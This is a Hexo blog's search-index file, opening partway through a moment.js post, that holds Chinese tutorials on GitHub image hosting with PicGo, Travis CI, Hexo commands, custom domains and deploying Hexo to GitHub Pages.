获取天</span><br><span class="line">moment().day()  &#x2F;&#x2F; 获取星期</span><br><span class="line">moment().dayOfYear()  &#x2F;&#x2F; 一年内的多少天</span><br><span class="line">moment().week() &#x2F;&#x2F; 一年里的多少周</span><br><span class="line">moment().month()  &#x2F;&#x2F; 获取当前月份（实际月份-1）</span><br><span class="line">moment().quarter() &#x2F;&#x2F; 一年内的第几个季度</span><br><span class="line">moment().year() &#x2F;&#x2F; 获取年份</span><br><span class="line">moment().daysInMonth() &#x2F;&#x2F; 获取当月天数</span><br></pre></td></tr></table></figure><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p>一旦解析和操作完成后，需要某些方式来显示 moment。</p><p>使用<code>format</code>来格式化日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;</span><br><span class="line">moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 时间戳转换为日期格式</span><br><span class="line">moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式</span><br><span class="line">moment().unix();        &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;X&quot;);   &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;x&quot;);   &#x2F;&#x2F; 获取Unix 毫秒时间戳</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何选择一个适合自己的图床</title>
      <link href="/how-to-choose-a-picture-bed-that-suits-you/"/>
      <url>/how-to-choose-a-picture-bed-that-suits-you/</url>
      
        <content type="html"><![CDATA[<p>因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。</p><p>如果不是因为<a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS</a> 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png" alt=""></p><p>于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。</p><p>使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。</p><a id="more"></a><blockquote><p>为什么不选择国内的那些图床服务？</p></blockquote><p>我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。</p><h3 id="图床管理工具"><a href="#图床管理工具" class="headerlink" title="图床管理工具"></a>图床管理工具</h3><p>有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 <a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a>，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。</p><h3 id="创建GitHub-图床"><a href="#创建GitHub-图床" class="headerlink" title="创建GitHub 图床"></a>创建GitHub 图床</h3><p>首先，你得有一个<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 账号。</p><h4 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h4><p>这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。</p><h4 id="2-获取授权token"><a href="#2-获取授权token" class="headerlink" title="2. 获取授权token"></a>2. 获取授权token</h4><p>通过<code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> <a href="https://github.com/settings/tokens/new" target="_blank" rel="noopener">创建一个新的token</a> 用于PicGo操作你的仓库。</p><p>把repo的勾打上即可，点击Generate token的绿色按钮生成 token。</p><p>创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。</p><h3 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h3><p>GitHub 图床的配置还是比较简单的，下面是参数说明。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225324.png" alt=""></p><ul><li>仓库名：你的图床仓库的名称，格式为：<code>username/repository</code></li><li>分支名：一般选择默认分支 <code>master</code></li><li>Token：刚才生成的 Token</li><li>存储路径：指定存放在仓库的哪个目录下</li><li>自定义域名：<code>raw.githubusercontent.com/username/repository/branch</code></li></ul><p>自定义域名最好按照一定的规则去定义：<code>raw.githubusercontent.com</code>+你的github用户名+仓库名称+分支名称</p><blockquote><p><code>raw.githubusercontent.com</code> 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。</p></blockquote><p>通常配置完成之后，就可以直接使用了。</p><p>如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706220223.png" alt=""></p><p>如果得到了这样的异常，那么大概率是因为你没有开启全局代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96;</span><br></pre></td></tr></table></figure><p>因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。</p><p>如果你还有其他问题，可以查阅 <a href="https://github.com/Molunerfinn/PicGo/blob/dev/FAQ.md" target="_blank" rel="noopener">PicGo FAQ</a>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。</li><li>如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。</li><li>如果打算长期稳定使用可以优先选择又拍云或者七牛云。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> Skill </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Travis CI 快速上手</title>
      <link href="/travis-ci-quick-start/"/>
      <url>/travis-ci-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。</p><p>它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。</p><p>其中最出名大概就是<a href="https://travis-ci.com/" target="_blank" rel="noopener">Travis CI</a>了，本文的目的就是快速入门 Travis CI。</p><a id="more"></a><h2 id="什么是持续集成？"><a href="#什么是持续集成？" class="headerlink" title="什么是持续集成？"></a>什么是持续集成？</h2><p>持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。</p><p>而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。</p><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p>在正式开始之前，需要提前准备好以下先决条件：</p><ul><li>一个 <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 帐户</li><li>托管在 <a href="https://github.com/" target="_blank" rel="noopener">Github</a> 的项目的所有者权限</li></ul><p>需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。</p><h4 id="在Github-上使用Travis-CI"><a href="#在Github-上使用Travis-CI" class="headerlink" title="在Github 上使用Travis CI"></a>在Github 上使用Travis CI</h4><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的项目中新建一个 <code>.travis.yml</code> 文件。</li><li>提交并推送以触发Travis CI构建。</li></ol><p>其中<code>.travis.yml</code>文件的目的是告诉 Travis CI 应该做些什么。</p><p>以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">language: ruby</span><br><span class="line">rvm:</span><br><span class="line"> - 2.2</span><br><span class="line"> - jruby</span><br></pre></td></tr></table></figure><p>通过访问<a href="https://travis-ci.com/auth" target="_blank" rel="noopener">Travis CI</a> 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。</p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> CI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 快速上手</title>
      <link href="/hexo-quick-start/"/>
      <url>/hexo-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。</p><a id="more"></a><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>新建一个网站。如果没有设置 <code>folder</code>，Hexo 默认在目前的文件夹建立网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>layout 有三种选择：</p><ul><li>post：新建一片文章</li><li>page：新建一个页面</li><li>draft：新建一篇草稿</li></ul><p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><p>生成静态文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo g</span><br></pre></td></tr></table></figure><p>常用参数：<br>|选项|描述|<br>|-|-|<br>|-d, –deploy|文件生成后立即部署网站|<br>|-w, –watch|监视文件变动|<br>|-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常|</p><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><p>发表草稿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo s</span><br></pre></td></tr></table></figure><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><p>部署网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo d</span><br></pre></td></tr></table></figure><p><code>-g</code>，<code>--generate</code>：部署之前预先生成静态文件</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>列出网站资料。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo list</span><br></pre></td></tr></table></figure><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>显示 Hexo 版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo version</span><br></pre></td></tr></table></figure><h3 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe</span><br></pre></td></tr></table></figure><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>在终端中显示调试信息并记录到 debug.log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --debug</span><br></pre></td></tr></table></figure><h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><p>显示 source/_drafts 文件夹中的草稿文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --draft</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="CNAME-文件被删除"><a href="#CNAME-文件被删除" class="headerlink" title="CNAME 文件被删除"></a>CNAME 文件被删除</h3><p>GitHub Pages 为我们免费提供了<code>&lt;username&gt;.github.io</code>这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。</p><p>通常绑定完成之后，会在项目目录下面生成一个叫做<code>CNAME</code>的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。</p><p>这个时候就会产生一个问题：</p><blockquote><p>CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。</p></blockquote><p>有以下几种方式可以解决这个问题：</p><ol><li>每次 <code>hexo d</code> 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐</li><li>在 <code>hexo g</code> 之后， <code>hexo d</code> 之前，把CNAME文件复制到 <code>public</code> 目录下面，里面写入你要绑定的域名。—— 繁琐</li><li>将需要上传至 GitHub 的内容放在<code>source</code>文件夹，例如CNAME、favicon.ico、images等，这样在 <code>hexo d</code> 之后就不会被删除了。</li><li>通过安装插件实现永久保留。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-cname --save</span><br></pre></td></tr></table></figure><p>编辑<code>_config.yml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-cname</span><br></pre></td></tr></table></figure><p>推荐第三种方式，简单方便。</p><h3 id="配置apex-域"><a href="#配置apex-域" class="headerlink" title="配置apex 域"></a>配置apex 域</h3><p>Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 <code>CNAME</code>的私有子域名，那有没有办法主域名呢？</p><p>答案是有的。</p><p>如果绑定主域名，例如 example.com，建议还设置一个 <code>www</code> 子域，GitHub Pages 将自动在域之间创建重定向，当输入<code>example.com</code>时，会重定向到 <code>www.example.com</code>。</p><p>通常我们绑定好私有子域名之后，回生成一个<code>CNAME</code>的文件，里面记录着我们绑定好的私有子域名。</p><p>此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录：</p><ul><li>创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。</li><li>创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; GitHub Pages 的 IP 地址</span><br><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>这里我选择的是创建A 记录，所以我的DNS 解析是这样的：</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706203008.png" alt="DNS解析A记录"></p><p>配置完DNS 解析之后，可以使用<code>dig</code>命令来检验是否解析成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig example.com +noall +answer</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; aikang.me +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">aikang.me.4502INA185.199.111.153</span><br><span class="line">aikang.me.4502INA185.199.110.153</span><br><span class="line">aikang.me.4502INA185.199.108.153</span><br><span class="line">aikang.me.4502INA185.199.109.153</span><br></pre></td></tr></table></figure><p>将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。</p><p>至此，就完成了apex 域的配置了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/chengxs/p/7496265.html" target="_blank" rel="noopener">github+hexo搭建自己的博客网站（七）注意事项</a></li><li><a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">Hexo | 指令</a></li><li><a href="https://docs.github.com/cn/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain" target="_blank" rel="noopener">管理 GitHub Pages 站点的自定义域</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Pages 部署 Hexo 个人博客</title>
      <link href="/deploy-hexo-using-github-pages-personal-blog/"/>
      <url>/deploy-hexo-using-github-pages-personal-blog/</url>
      
        <content type="html"><![CDATA[<p>关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。</p><p>这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。</p><a id="more"></a><blockquote><p>为什么使用Github Pages？</p></blockquote><p>我是出于以下原因考虑的：</p><ol><li>暂时没有服务器的需要，我只想有一个能写博客的地方。</li><li>GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。</li><li>免费</li></ol><p>总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。</p><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Mac OS 10.15.4</li><li>Node.js 12</li><li>Hexo-cli: 3.1</li><li>NPM: 6.9</li></ul><h3 id="创建Github-Pages"><a href="#创建Github-Pages" class="headerlink" title="创建Github Pages"></a>创建Github Pages</h3><p>Github Pages分为两类，用户或组织主页、项目主页。</p><ul><li>用户或组织主页：在新建仓库时，仓库名称应该以<code>&lt;yourusername&gt;.github.io</code>的格式去填写。<code>&lt;yourusername&gt;</code>指的是你的Github 的用户名称。</li><li>创建项目主页：在新建仓库时，名称可以任意设置，然后通过<code>Setting-&gt;Options-&gt;Github Pages</code>将 <code>Source</code>选项设置为<code>Master Branch</code>，此时这个项目就变成一个 Github Pages项目了。</li></ul><p>需要注意的是：</p><ol><li>Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。</li><li>第一种方式不能更改 Github Pages 部署分支。</li><li>如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问<code>http://&lt;yourusername&gt;.github.io</code>。</li></ol><h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><p>如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。</p><p>在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。</p><p>首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名<code>blog.aikang.me</code>，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 <code>0xAiKang.github.io</code>。</p><p><img src="https://i.loli.net/2020/07/04/BDX384QPIZqniJU.png" alt="DNS 域名解析"></p><p>添加完成后等待 DNS 解析的生效的同时回到项目的<code>Setting</code>界面，将刚才的子域名与 Github Pages 绑定在一起。</p><p>保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。</p><p><img src="https://i.loli.net/2020/07/04/OZ2Vu8p9tXgTj7q.png" alt="等待 GitHub 生成证书并确认域名解析正常"></p><h3 id="将Hexo-部署到Github-Pages"><a href="#将Hexo-部署到Github-Pages" class="headerlink" title="将Hexo 部署到Github Pages"></a>将Hexo 部署到Github Pages</h3><p>域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。</p><p>目前市场上有很多优秀的静态模板系统，比如：</p><ul><li>Node.js 编写的 Hexo</li><li>Go 编写的 Hugo</li><li>Python 编写的 Pelican</li><li>静态博客写作客户端 Gridea</li></ul><blockquote><p>为什么要选择Hexo？</p></blockquote><p>最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。</p><p>不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。</p><blockquote><p>如何将 Hexo 部署到 GitHub Pages？</p></blockquote><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 <a href="https://travis-ci.com/" target="_blank" rel="noopener">手动前往</a>。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的 Hexo 站点文件夹中新建一个 <code>.travis.yml</code> 文件：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo: false</span><br><span class="line">language: node_js</span><br><span class="line">node_js:</span><br><span class="line">  - 10 # use nodejs v10 LTS</span><br><span class="line">cache: npm</span><br><span class="line">branches:</span><br><span class="line">  only:</span><br><span class="line">    - master # build master branch only</span><br><span class="line">script:</span><br><span class="line">  - hexo generate # generate static files</span><br><span class="line">deploy:</span><br><span class="line">  provider: pages</span><br><span class="line">  skip-cleanup: true</span><br><span class="line">  github-token: $GH_TOKEN</span><br><span class="line">  keep-history: true</span><br><span class="line">  on:</span><br><span class="line">    branch: master</span><br><span class="line">  local-dir: public</span><br></pre></td></tr></table></figure><p>上面这个配置文件的作用是用来自动构建，编译测试。</p><p>将 <code>.travis.yml</code> 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 <code>gh-pages</code> 分支下。</p><h4 id="修改发布源"><a href="#修改发布源" class="headerlink" title="修改发布源"></a>修改发布源</h4><p>推送完成之后，会发现多了一个 <code>gh-gages</code>分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用<code>master</code>分支作为发布源，所以我们需要切换发布源。</p><p>在<code>Setting-&gt;Option-&gt;GitHub Pages</code>下，使用 Source（源）下拉菜单选择发布源。</p><p><img src="https://i.loli.net/2020/07/04/AHldtP2bIhaqr8c.png" alt="修改默认源"></p><p>注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 <code>master</code>分支。</p><h3 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h3><p>Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。</p><p>在正式部署之前，我们需要先修改<code>_config.yml</code> 文件，配置参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td>type</td><td>deployer</td><td>-</td></tr><tr><td>repo</td><td>项目地址</td><td>-</td></tr><tr><td>branch</td><td>分支名称</td><td>gh-pages</td></tr></tbody></table><p>有以下两点需要注意：<br>1.repo 需要选择SSH 协议，HTTPS协议会报错。<br>2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支</p><p>我这里使用的是<code>git</code> 作为 deployer，所以需要手动安装一个插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>生成站点文件并部署至远程库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo deploy --generate</span><br></pre></td></tr></table></figure><p>至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://sspai.com/post/54608" target="_blank" rel="noopener">Github Pages 搭建教程</a></li><li><a href="https://hexo.io/zh-cn/docs/github-pages.html" target="_blank" rel="noopener">将Hexo 部署到 GitHub Pages</a></li><li><a href="https://hexo.io/zh-cn/docs/one-command-deployment.html" target="_blank" rel="noopener">Hexo 一键部署</a></li><li><a href="https://juejin.im/post/5acf02086fb9a028b92d8652#heading-15" target="_blank" rel="noopener">Github Pages部署个人博客（Hexo篇）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
